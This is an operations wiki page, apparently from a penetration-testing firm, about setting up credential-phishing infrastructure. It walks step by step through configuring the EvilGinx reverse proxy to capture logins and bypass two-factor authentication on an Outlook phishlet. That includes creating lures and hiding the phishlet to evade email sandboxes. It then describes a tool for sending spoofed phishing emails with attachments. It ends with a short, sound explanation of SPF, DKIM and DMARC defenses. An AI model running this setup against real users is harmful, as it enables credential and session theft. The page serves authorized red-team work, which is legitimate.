<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# Phishing Credential Infrastructure
### References

### Overview

### EvilGinx
#### Overview
* EvilGinx is a phishing reverse-proxy which can bypass 2FA

#### Process
1. Set Up Server and Domain
	* Overview
		* EvilGinx needs control over DNS in order to generate its own hostnames and SSL certificates automatically
	* Process
		1. Spin up server on DigitalOcean, AWS, etc.
		1. Ensure the following ports are opened in the firewall:
			* 53/UDP
			* 80/TCP
			* 443/TCP
		1. Change nameservers for phishing domain to point to the server's IP
			* For example: ```ns1.phishingdomain.com --> 1.2.3.4``````ns2.phishingdomain.com --> 1.2.3.4```
	* Notes
		* If the domain is being shared with a Mailinabox server then you need to add the following DNS entries on the "Custom DNS" page of the Mailinabox admin panel.
			* Add an "A" record for the Fully-Qualified Domain Name that you wish to use for EvilGinx and set the value to the public IP Address of your server. Ex. docs.evilcorp.com     A    123.456.789.123
			* Add an "NS" record for the Fully-Qualified Domain Name where the value is set to the Fully-Qualified Domain Name as well. Ex. docs.evilcorp.com    NS    docs.evilcorp.com
		* The TTL for Mailinabox is 30 minutes so you must wait that duration for your changes to take effect.
1. Install and Start EvilGinx
	* Requirements
		* Working golang environment (i.e., $GOPATH variable and $GOPATH/bin added to $PATH)

			```bash
			go get github.com/kgretzky/evilginx2
			evilginx2 -p $GOPATH/src/kgretzky/evilginx2/phishlets
			```

		* Recommended: start within a tmux session
	* Installation
		* Note
			* If you do not wish to go through the hassle of setting up a working GO environment then you can just use the binary. ===
		* Commands

			```bash
			$ apt-get update
			$ apt-get upgrade
			$ wget https://github.com/kgretzky/evilginx2/releases/download/2.3.0/evilginx_linux_x86_2.3.0.zip
			$ apt-get install unzip
			$ unzip evilginx
			$ cd evilginx
			$ chmod +x install.sh
			$ chmod +x evilginx
			```
		* Also, be sure to stop system-resolved to allow Evilginx to act as the DNS server

			```bash
			$ systemctl disable systemd-resolved
			$ systemctl stop systemd-resolved
			$ rm /etc/resolv.conf
			$ echo 'nameserver 8.8.8.8' > /etc/resolv.conf
			```
1. Configure Phishing Page
	1. Set the domain and IP of the evilginx server
		* Note
			* `redirect_url` is where unauthorized requests (e.g. web scanners) are redirected
		* Command

			``bash
			: config domain evilginx.phishingdomain.com
			: config ip <public_ip>
			: config redirect_url https://www.foxnews.com/
			```

	1. **Type `config` at any time to view the configuration**

		```
		: config

		             domain : evilginx.phishingdomain.com
		                 ip : 1.2.3.4
		       redirect_key : md
		   verification_key : is
		 verification_token : 3b0a
		       redirect_url : https://www.foxnews.com/
		:
		```
	1. **Type `phishlets` to view available phishing modules and their status**
		
		```
		: phishlets
		+-----------------+--------------+-----------+------------+---------------------------------+                                                                         
		|    phishlet     |   author     |  active   |  status    |             hostname            |                                                                         
		+-----------------+--------------+-----------+------------+---------------------------------+                                                                         
		| facebook        | @mrgretzky   | disabled  | available  |                                 |                                                                         
		| linkedin        | @mrgretzky   | disabled  | available  |                                 |
		| outlook         | @mrgretzky   | enabled   | available  | outlook.com.phishingdomain.com  |
		| reddit          | @customsync  | disabled  | available  |                                 |
		| twitter-mobile  | @white_fi    | disabled  | available  |                                 |
		| twitter         | @white_fi    | disabled  | available  |                                 |
		| amazon          | @customsync  | disabled  | available  |                                 |
		| citrix          | @424f424f    | disabled  | available  |                                 |
		+-----------------+--------------+-----------+------------+---------------------------------+
		```

	1. Set a hostname for the phishlet (I recommend the domain of the target site + the phishing domain)

		```bash
		: phishlets hostname outlook outlook.com.phishingdomain.com
		[20:10:51] [inf] phishlet 'outlook' hostname set to: outlook.com.phishingdomain.com
		```
		
	1. Enable the phishlet
		
		```bash
		: phishlets hostname outlook outlook.com.phishingdomain.com
		: phishlets enable outlook
		[20:19:45] [inf] enabled phishlet 'outlook'
		[20:19:45] [inf] setting up certificates for phishlet 'outlook'...
		[20:19:45] [war] failed to load certificate files for phishlet 'outlook', domain 'outlook.com.phishingdomain.com': open /root/.evilginx/crt/outlook.com.phishingdomain.com/outlook.crt: no such file or directory
		[20:19:45] [inf] requesting SSL/TLS certificates from LetsEncrypt...
		[20:19:51] [+++] successfully set up SSL/TLS certificates for domains: [www.outlook.com.phishingdomain.com ]
		```

1. Deliver URL via Email, etc.
	* Note
		* Any requests to EvilGinx must include a special token, otherwise they are redirected.
	* Process
		1. **Create the lure**,
		
			```bash
			: lures create outlook

			[22:43:48] [inf] created lure with ID: 0
			```

		1. **Retrieve the URL for the phishing module**
		
			```bash
			: lures get-url 0

			https://outlook.phishindomain.com/ATzVmPIz
			```

		1. **Set the redirect URL**, specifying the page you want the victim to be redirected to after successful authentication.
		
			```bash
			: lures edit redirect_url 0 https://www.outlook.com
			[22:49:05] [inf] redirect_url = 'https://www.outlook.com'
			```

		1. **Be sure to "hide" the phishlet** (temporarily disable it) before sending the email.
		
			```bash
			: phishlets hide outlook
			[20:37:08] [inf] phishlet 'outlook' is now hidden and all requests to it will be redirected
			```

		1. **Wait for a couple minutes** (until you suspect the email sandboxes have finished with their shenanigans), **then re-enable the phishlet** so the victim can access it.
		
			```bash
			: phishlets unhide outlook
			[20:39:18] [inf] phishlet 'outlook' is now reachable and visible from the outside
			```


### Lure Framework
#### Overview
Currently BLS has an offensive framework called Lure. This framework allows you to customize, attach files, and send phishing email to targets for a campaign.

#### Requirements
* Requires [https://www.meteor.com/install Meteor Framework] to run Lure:

	```bash
	curl https://install.meteor.com/ | sh
	```

* At least a 1 gig of RAM in VM

#### Setup
1. Pushing the Lure Framework to the VM.
1. Extract Lure into its own folder.
1. Install
1. Update to the latest Meteor version:

	```bash
	meteor update
	```
1. Run the Lure framework (from within the Lure directory)

	```bash
	meteor
	```
1. Connect to the server ([http://localhost:3000](http://localhost:3000))

#### Process
1. Prepare the email
	* Required Fields
		* **Outgoing IP address** : This is the IP that is the receiving email server uses (This can also be a DNS name)
		* **Display From address** : This will show up in the email as the "sending email"
		* **Email From** : This is the email that will be used to tell the email server what Sending Email server said it was from (Needs to match the FQDN)
		* **FQDN Of Spoofed Sender** : This is the FQDN that the receiving email server will be told where the email originated from. This needs to match the MX Record in the DNS if mailing to the DISA Enterprise Email Server.
		* **To Emails** : This will bring up a modal that will allow you to enter the emails one per line. These emails will show up in the "To Address" of the email. (Not Required, if CC/BCC used)
		* **CC Emails** : This will bring up a modal that will allow you to enter the emails one per line. These emails will show up in the "CC Address" of the email. (Not Required, if To/BCC used)
		* **BCC Emails** : This will bring up a modal that will allow you to enter the emails one per line. These emails will show up in the "BCC Address" of the email. (Not required, if To/CC used)
		* **Subject** : This will be the subject of the email sent.
		* **Content** : This will be the body of the email sent. This can be HTML formatted. Make sure to use double return lines for line breaks.
		* **Attachment** : This will be the file attached in the email. This will be locally stored on the Phishing Framework Website.
	* Optional Fields
		* **Campaign Name** : Campaign Named to be referenced in the logging file to keep track of what campaign the email was a part of.
		* **UUID Metasploit** : UUID of the metasploit that was included in the package to track which email in the campaign it was a part of.
1. Click **Preview Email**, view the completed fields and message.
1. Select **Send Email**.
	* This will send the email from the Lure Framework machine to the receiving IP/DNS of the "Outgoing Address" you listed above. A Log will be created for the successful sending of the email. If no log is created, check the terminal of the machine that is running Lure. It will display Debugging and Error output to the screen.

# Defense

Today, there are three solutions available to protect yourself from spoofed emails: SPF, DKIM and DMARC. To effectively stop forged email being delivered, the sending domains, their mail servers, and the receiving system all need to be configured correctly for these higher standards of authentication.

https://blog.detectify.com/2016/06/20/misconfigured-email-servers-open-the-door-to-spoofed-emails-from-top-domains/

### SPF

SPF is a record that is applied to the DNS-record (a global database containing information about domain names and their corresponding address) that specifies what servers are allowed to send email using that domain.
 
SPF can be set up to have three different actions: pass, softfail, hardfail, and neutral.

{| class="wikitable"
!Mode
!Statement
!Action
|-
|Pass
| +all
|Allow all mail
|-
|Softfail 
| ~all
|Accept but mark domains not specified in records as suspicious or spam
|-
|Hardfail 
| -all
|Only allow mail that matches one of the parameters (IPv4, MX, etc) in the record
|-
|Neutral
| ?all 
|No policy statement
|}

### DKIM 

When sending an email from a server with DKIM configured, the server will hash the body and the header of the email separately. It will then, with a private key, create a signature it will send along with the email.

When the receiver then receives the email, it will do a DNS-request to the domain that the email said it was from, and by doing so get the public key which is the DKIM-record. It will then with help from that verify that the signature is correct, and by doing so confirming that the sender is correct and the mail have not been manipulated on its way there.

### DMARC

DMARC takes advantage of both SPF and DKIM, and can be seen as the recommended action to take when neither SPF or DKIM confirm an email as legit. DMARC actions are: ‘reject’, ‘quarantine’ or ‘none’.
 
‘Quarantine’ is to put the email into some kind of quarantine, while ‘reject’ is a full rejection. If rejected, an end-user will never see the email.
 
Another key feature of DMARC is to generate a report on when it failed, so the owner of the domain can know when someone is trying to send emails on their behalf.

### Identify Defenses

Get all the TXT-records for the domain (example.com) and look for the SPF-record, it will start with v=spf1. Then get the DMARC-record by looking at the TXT-record that begins with v=DMARC1 at the subdomain _dmarc (_dmarc.example.com).
 
If the SPF-record ends with “-all” that is enough. If it instead ends with “+all” or “~all” the DMARC-record needs to contain “p=reject” or “p=quarantine“. In any other case it would be considered insufficient.
 
The SPF-record should exist on all subdomains as well, while DMARC is only on the main domain. p refers to the main domain, while sp controls subdomains.

[http://mxtoolbox.com/NetworkTools.aspx MXToolbox.com] has searches available for [http://mxtoolbox.com/spf.aspx SPF], [http://mxtoolbox.com/dkim.aspx DKIM], and [http://mxtoolbox.com/dmarc.aspx DMARC].